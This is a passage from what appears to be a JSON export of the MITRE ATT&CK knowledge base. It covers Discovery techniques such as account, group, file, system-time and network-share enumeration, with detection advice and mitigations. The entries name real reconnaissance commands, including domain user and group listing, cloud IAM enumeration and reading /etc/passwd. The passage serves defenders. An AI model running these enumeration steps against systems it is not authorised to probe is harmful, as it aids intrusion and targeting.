Execution"],"mitigations":[],"subTechniques":[]},{"id":"T1069","name":"Permission Groups Discovery","description":"Adversaries may attempt to discover group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.\n\nAdversaries may attempt to discover group permission settings in many different ways. This data may provide the adversary with information about the compromised environment that can be used in follow-on activity and targeting. <a href=\"https://www.crowdstrike.com/blog/hidden-administrative-accounts-bloodhound-to-the-rescue/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CrowdStrike BloodHound April 2018)</a>","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell. Monitor container logs for commands and/or API calls related to listing permissions for pods and nodes, such as <code>kubectl auth can-i</code>. <a href=\"https://kubernetes.io/docs/reference/access-authn-authz/authorization/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: K8s Authorization Overview)</a>","platforms":["Containers","IaaS","Identity Provider","Linux","macOS","Office Suite","SaaS","Windows"],"dataSources":["Process: Process Creation","Group: Group Metadata","Command: Command Execution","Application Log: Application Log Content","Group: Group Enumeration"],"mitigations":[],"subTechniques":[{"id":"T1069.001","name":"Local Groups","description":"Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\n\nCommands such as <code>net localgroup</code> of the Net utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code> on Linux can list local groups.","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.","platforms":["Linux","macOS","Windows"],"dataSources":["Process: OS API Execution","Process: Process Creation","Group: Group Enumeration","Command: Command Execution"],"mitigations":[]},{"id":"T1069.002","name":"Domain Groups","description":"Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.\n\nCommands such as <code>net group /domain</code> of the Net utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.","platforms":["Linux","macOS","Windows"],"dataSources":["Group: Group Enumeration","Command: Command Execution","Process: OS API Execution","Process: Process Creation"],"mitigations":[]},{"id":"T1069.003","name":"Cloud Groups","description":"Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.\n\nWith authenticated access there are several tools that can be used to find permissions groups. The <code>Get-MsolRole</code> PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts <a href=\"https://docs.microsoft.com/en-us/powershell/module/msonline/get-msolrole?view=azureadps-1.0\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Msolrole)</a> <a href=\"https://github.com/True-Demon/raindance\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Raindance)</a>.\n\nAzure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups. The command <code>az ad user get-member-groups</code> will list groups associated to a user account for Azure while the API endpoint <code>GET https://cloudidentity.googleapis.com/v1/groups</code> lists group resources available to a user for Google. <a href=\"https://docs.microsoft.com/en-us/cli/azure/ad/user?view=azure-cli-latest\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft AZ CLI)</a> <a href=\"https://www.blackhillsinfosec.com/red-teaming-microsoft-part-1-active-directory-leaks-via-azure/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Black Hills Red Teaming MS AD Azure, 2018)</a> <a href=\"https://cloud.google.com/identity/docs/reference/rest\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Identity API Documentation)</a> In AWS, the commands <code>ListRolePolicies</code> and <code>ListAttachedRolePolicies</code> allow users to enumerate the policies attached to a role. <a href=\"https://unit42.paloaltonetworks.com/compromised-cloud-compute-credentials/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)</a>\n\nAdversaries may attempt to list ACLs for objects to determine the owner and other accounts with access to the object, for example, via the AWS <code>GetBucketAcl</code> API <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/API/API_GetBucketAcl.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Get Bucket ACL)</a>. Using this information an adversary can target accounts with permissions to a given object or leverage accounts they have already compromised to access the object.","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Activity and account logs for the cloud services can also be monitored for suspicious commands that are anomalous compared to a baseline of normal activity.","platforms":["SaaS","IaaS","Office Suite","Identity Provider"],"dataSources":["Command: Command Execution","Application Log: Application Log Content","Process: Process Creation","Group: Group Metadata","Group: Group Enumeration"],"mitigations":[]}]},{"id":"T1082","name":"System Information Discovery","description":"An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use this information to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. This behavior is distinct from Local Storage Discovery which is an adversary's discovery of local drive, disks and/or volumes.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. Adversaries may leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). <a href=\"https://www.us-cert.gov/ncas/alerts/TA18-106A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT-TA18-106A)</a> On ESXi servers, threat actors may gather system information from various esxcli utilities, such as <code>system hostname get</code> and <code>system version get</code>. <a href=\"https://www.crowdstrike.com/en-us/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)</a> <a href=\"https://www.varonis.com/blog/vmware-esxi-in-the-line-of-ransomware-fire\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Varonis)</a>\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine. <a href=\"https://docs.aws.amazon.com/cli/latest/reference/ssm/describe-instance-information.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Amazon Describe Instance)</a> <a href=\"https://cloud.google.com/compute/docs/reference/rest/v1/instances\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Instances Resource)</a> <a href=\"https://docs.microsoft.com/en-us/rest/api/compute/virtualmachines/get\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Virutal Machine API)</a>\n\nSystem Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment. <a href=\"https://www.sentinelone.com/blog/trail-osx-fairytale-adware-playing-malware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OSX.FairyTale)</a> <a href=\"https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: 20 macOS Common Tools and Techniques)</a>","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Further, Network Device CLI commands may also be used to gather  detailed system information with built-in features native to the network device platform.  Monitor CLI activity for unexpected or unauthorized use  commands being run by non-standard users from non-standard locations. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\nIn cloud-based systems, native logging can be used to identify access to certain APIs and dashboards that may contain system information. Depending on how the environment is used, that data alone may not be useful due to benign use during normal operations.","platforms":["ESXi","IaaS","Linux","macOS","Network Devices","Windows"],"dataSources":["Process: OS API Execution","Process: Process Creation","Command: Command Execution"],"mitigations":[],"subTechniques":[]},{"id":"T1083","name":"File and Directory Discovery","description":"Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. <a href=\"https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Commands JPCERT)</a> Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>). <a href=\"https://www.us-cert.gov/ncas/alerts/TA18-106A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT-TA18-106A)</a>\n\nSome files and directories may require elevated or specific user permissions to access.","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell. Further, Network Device CLI commands may also be used to gather file and directory information with built-in features native to the network device platform.  Monitor CLI activity for unexpected or unauthorized use of commands being run by non-standard users from non-standard locations.","platforms":["ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["Command: Command Execution","Process: Process Creation","Process: OS API Execution"],"mitigations":[],"subTechniques":[]},{"id":"T1087","name":"Account Discovery","description":"Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., Valid Accounts).\n\nAdversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.\n\nFor examples, cloud environments typically provide easily accessible interfaces to obtain user lists. <a href=\"https://docs.aws.amazon.com/cli/latest/reference/iam/list-users.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS List Users)</a> <a href=\"https://cloud.google.com/sdk/gcloud/reference/iam/service-accounts/list\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud - IAM Servie Accounts List API)</a> On hosts, adversaries can use default PowerShell and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system’s files.","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\nMonitor for processes that can be used to enumerate user accounts, such as <code>net.exe</code> and <code>net1.exe</code>, especially when executed in quick succession. <a href=\"https://www.elastic.co/blog/embracing-offensive-tooling-building-detections-against-koadic-using-eql\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic - Koadiac Detection with EQL)</a>","platforms":["ESXi","IaaS","Identity Provider","Linux","macOS","Office Suite","SaaS","Windows"],"dataSources":["Process: Process Creation","Command: Command Execution","File: File Access"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Manage the creation, modification, use, and permissions associated to user accounts."},{"id":"M1028","name":"Operating System Configuration","description":"Prevent administrator accounts from being enumerated when an application is elevating through UAC since it can lead to the disclosure of account names. The Registry key is located <code>HKLM\\ SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\CredUI\\EnumerateAdministrators</code>. It can be disabled through GPO: Computer Configuration &gt; [Policies] &gt; Administrative Templates &gt; Windows Components &gt; Credential User Interface: E numerate administrator accounts on elevation. <a href=\"https://www.stigviewer.com/stig/microsoft_windows_server_2012_member_server/2013-07-25/finding/WN12-CC-000077\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: UCF STIG Elevation Account Enumeration)</a>"}],"subTechniques":[{"id":"T1087.001","name":"Local Account","description":"Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.\n\nCommands such as <code>net user</code> and <code>net localgroup</code> of the Net utility and <code>id</code> and <code>groups</code> on macOS and Linux can list local users and groups. <a href=\"https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant APT1)</a> <a href=\"https://linux.die.net/man/1/id\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: id man page)</a> <a href=\"https://linux.die.net/man/1/groups\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: groups man page)</a> On Linux, local users can also be enumerated through the use of the <code>/etc/passwd</code> file. On macOS, the <code>dscl . list /Users</code> command can be used to enumerate local accounts. On ESXi servers, the <code>esxcli system account list</code> command can list local user accounts. <a href=\"https://www.crowdstrike.com/en-us/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)</a>","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\nMonitor for processes that can be used to enumerate user accounts, such as <code>net.exe</code> and <code>net1.exe</code>, especially when executed in quick succession. <a href=\"https://www.elastic.co/blog/embracing-offensive-tooling-building-detections-against-koadic-using-eql\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic - Koadiac Detection with EQL)</a>","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["Process: OS API Execution","Group: Group Enumeration","Process: Process Creation","Command: Command Execution","File: File Access"],"mitigations":[{"id":"M1028","name":"Operating System Configuration","description":"Prevent administrator accounts from being enumerated when an application is elevating through UAC since it can lead to the disclosure of account names. The Registry key is located at <code>HKLM\\ SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\CredUI\\EnumerateAdministrators</code>. It can be disabled through GPO: Computer Configuration &gt; [Policies] &gt; Administrative Templates &gt; Windows Components &gt; Credential User Interface: Enumerate administrator accounts on elevation. <a href=\"https://www.stigviewer.com/stig/microsoft_windows_server_2012_member_server/2013-07-25/finding/WN12-CC-000077\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: UCF STIG Elevation Account Enumeration)</a>"}]},{"id":"T1087.002","name":"Domain Account","description":"Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.\n\nCommands such as <code>net user /domain</code> and <code>net group /domain</code> of the Net utility, <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups. PowerShell cmdlets including <code>Get-ADUser</code> and <code>Get-ADGroupMember</code> may enumerate members of Active Directory groups. <a href=\"https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CrowdStrike StellarParticle January 2022)</a>","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.","platforms":["Linux","macOS","Windows"],"dataSources":["Process: Process Creation","Command: Command Execution","Process: OS API Execution","Network Traffic: Network Traffic Content","Group: Group Enumeration"],"mitigations":[{"id":"M1028","name":"Operating System Configuration","description":"Prevent administrator accounts from being enumerated when an application is elevating through UAC since it can lead to the disclosure of account names. The Registry key is located at <code>HKLM\\ SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\CredUI\\EnumerateAdministrators</code>. It can be disabled through GPO: Computer Configuration &gt; [Policies] &gt; Administrative Templates &gt; Windows Components &gt; Credential User Interface: Enumerate administrator accounts on elevation. <a href=\"https://www.stigviewer.com/stig/microsoft_windows_server_2012_member_server/2013-07-25/finding/WN12-CC-000077\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: UCF STIG Elevation Account Enumeration)</a>"}]},{"id":"T1087.003","name":"Email Account","description":"Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs). <a href=\"https://docs.microsoft.com/en-us/exchange/email-addresses-and-address-books/address-lists/address-lists?view=exchserver-2019\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Exchange Address Lists)</a>\n\nIn on-premises Exchange and Exchange Online, the <code>Get-GlobalAddressList</code> PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session. <a href=\"https://docs.microsoft.com/en-us/powershell/module/exchange/email-addresses-and-address-books/get-globaladdresslist\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft getglobaladdresslist)</a> <a href=\"https://www.blackhillsinfosec.com/attacking-exchange-with-mailsniper/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Black Hills Attacking Exchange MailSniper, 2016)</a>\n\nIn Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization. <a href=\"https://support.google.com/a/answer/166870?hl=en\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Workspace Global Access List)</a>","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.","platforms":["Windows","Office Suite"],"dataSources":["Process: Process Creation","Command: Command Execution"],"mitigations":[]},{"id":"T1087.004","name":"Cloud Account","description":"Adversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application.\n\nWith authenticated access there are several tools that can be used to find accounts. The <code>Get-MsolRoleMember</code> PowerShell cmdlet can be used to obtain account names given a role or permissions group in Office 365. <a href=\"https://docs.microsoft.com/en-us/powershell/module/msonline/get-msolrolemember?view=azureadps-1.0\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft msolrolemember)</a> <a href=\"https://github.com/True-Demon/raindance\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Raindance)</a> The Azure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated access to a domain. The command <code>az ad user list</code> will list all users within a domain. <a href=\"https://docs.microsoft.com/en-us/cli/azure/ad/user?view=azure-cli-latest\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft AZ CLI)</a> <a href=\"https://www.blackhillsinfosec.com/red-teaming-microsoft-part-1-active-directory-leaks-via-azure/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Black Hills Red Teaming MS AD Azure, 2018)</a> \n\nThe AWS command <code>aws iam list-users</code> may be used to obtain a list of users in the current account while <code>aws iam list-roles</code> can obtain IAM roles that have a specified path prefix. <a href=\"https://docs.aws.amazon.com/cli/latest/reference/iam/list-roles.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS List Roles)</a> <a href=\"https://docs.aws.amazon.com/cli/latest/reference/iam/list-users.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS List Users)</a> In GCP, <code>gcloud iam service-accounts list</code> and <code>gcloud projects get-iam-policy</code> may be used to obtain a listing of service accounts and users in a project. <a href=\"https://cloud.google.com/sdk/gcloud/reference/iam/service-accounts/list\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud - IAM Servie Accounts List API)</a>","detection":"Monitor processes, command-line arguments, and logs for actions that could be taken to gather information about cloud accounts, including the use of calls to cloud APIs that perform account discovery.\n\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment, and also to an extent in normal network operations. Therefore discovery data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.","platforms":["IaaS","Identity Provider","Office Suite","SaaS"],"dataSources":["Command: Command Execution"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit permissions to discover cloud accounts in accordance with least privilege. Organizations should limit the number of users within the organization with an IAM role that has administrative privileges, strive to reduce all permanent privileged role assignments, and conduct periodic entitlement reviews on IAM users, roles and policies."},{"id":"M1047","name":"Audit","description":"Routinely check user permissions to ensure only the expected users have the ability to list IAM identities or otherwise discover cloud accounts."}]}]},{"id":"T1120","name":"Peripheral Device Discovery","description":"Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. <a href=\"https://linuxhint.com/list-usb-devices-linux/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Peripheral Discovery Linux)</a> <a href=\"https://ss64.com/osx/system_profiler.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Peripheral Discovery macOS)</a> Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.","platforms":["Linux","macOS","Windows"],"dataSources":["Process: OS API Execution","Process: Process Creation","Command: Command Execution"],"mitigations":[],"subTechniques":[]},{"id":"T1124","name":"System Time Discovery","description":"An adversary may gather the system time and/or time zone settings from a local or remote system. The system time is set and stored by services, such as the Windows Time Service on Windows or <code>systemsetup</code> on macOS. <a href=\"https://msdn.microsoft.com/ms724961.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MSDN System Time)</a> <a href=\"https://technet.microsoft.com/windows-server-docs/identity/ad-ds/get-started/windows-time-service/windows-time-service-tools-and-settings\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Technet Windows Time Service)</a> <a href=\"https://support.apple.com/en-gb/guide/remote-desktop/apd95406b8d/mac\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: systemsetup mac time)</a> These time settings may also be synchronized between systems and services in an enterprise network, typically accomplished with a network time server within a domain. <a href=\"https://www.macinstruct.com/tutorials/synchronize-your-macs-clock-with-a-time-server/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mac Time Sync)</a> <a href=\"https://wiki.archlinux.org/title/System_time\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: linux system time)</a>\n\nSystem time information may be gathered in a number of ways, such as with Net on Windows by performing <code>net time \\\\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>. <a href=\"https://technet.microsoft.com/windows-server-docs/identity/ad-ds/get-started/windows-time-service/windows-time-service-tools-and-settings\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Technet Windows Time Service)</a> In addition, adversaries can discover device uptime through functions such as <code>GetTickCount()</code> to determine how long it has been since the system booted up. <a href=\"https://www.picussecurity.com/resource/virtualization/sandbox-evasion-how-attackers-avoid-malware-analysis\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Virtualization/Sandbox Evasion)</a>\n\nOn network devices, Network Device CLI commands such as <code>show clock detail</code> can be used to see the current time configuration. <a href=\"https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/security/s1/sec-s1-cr-book/sec-cr-s2.html#wp1896741674\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: show_clock_detail_cisco_cmd)</a> On ESXi servers, <code>esxcli system clock get</code> can be used for the same purpose.\n\nIn addition, system calls – such as <code>time()</code> – have been used to collect the current time on Linux devices. <a href=\"https://research.checkpoint.com/2024/magnet-goblin-targets-publicly-facing-servers-using-1-day-vulnerabilities/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MAGNET GOBLIN)</a> On macOS systems, adversaries may use commands such as <code>systemsetup -gettimezone</code> or <code>timeIntervalSinceNow</code> to gather current time zone information or current date and time. <a href=\"https://www.picussecurity.com/resource/the-system-information-discovery-technique-explained-mitre-attack-t1082\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: System Information Discovery Technique)</a> <a href=\"https://www.welivesecurity.com/2022/01/25/watering-hole-deploys-new-macos-malware-dazzlespy-asia/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET DazzleSpy Jan 2022)</a>\n\nThis information could be useful for performing other techniques, such as executing a file with a Scheduled Task/Job <a href=\"https://www.rsaconference.com/writable/presentations/file_upload/ht-209_rivner_schwartz.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: RSA EU12 They're Inside)</a>, or to discover locality information based on time zone to assist in victim targeting (i.e. System Location Discovery). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time. <a href=\"https://any.run/cybersecurity-blog/time-bombs-malware-with-delayed-execution/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AnyRun TimeBomb)</a>","detection":"Command-line interface monitoring may be useful to detect instances of net.exe or other command-line utilities being used to gather system time or time zone. Methods of detecting API use for gathering this information are likely less useful due to how often they may be used by legitimate software.\n\nFor network infrastructure devices, collect AAA logging to monitor <code>show</code> commands being run by non-standard users from non-standard locations.","platforms":["ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["Process: OS API Execution","Command: Command Execution","Process: Process Creation"],"mitigations":[],"subTechniques":[]},{"id":"T1135","name":"Network Share Discovery","description":"Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \n\nFile sharing over a Windows network occurs over the SMB protocol. <a href=\"https://en.wikipedia.org/wiki/Shared_resource\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Shared Resource)</a> <a href=\"https://technet.microsoft.com/library/cc770880.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Shared Folder)</a> Net can be used to query a remote system for available shared drives using the <code>net view \\\\\\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>. For macOS, the <code>sharing -l</code> command lists all shared points used for smb services.","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.","platforms":["Linux","macOS","Windows"],"dataSources":["Process: OS API Execution","Command: Command Execution","Process: Process Creation"],"mitigations":[{"id":"M1028","name":"Operating System Configuration","description":"Enable Windows Group Policy “Do Not Allow Anonymous Enumeration of SAM Accounts and Shares” security setting to limit users who can enumerate network shares. <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-access-do-not-allow-anonymous-enumeration-of-sam-accounts-and-shares\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Anonymous Enumeration of SAM Accounts)</a>"}],"subTechniques":[]},{"id":"T1201","name":"Password Policy Discovery","description":"Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack through Brute Force. This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).\n\nPassword policies can be set and discovered on Windows, 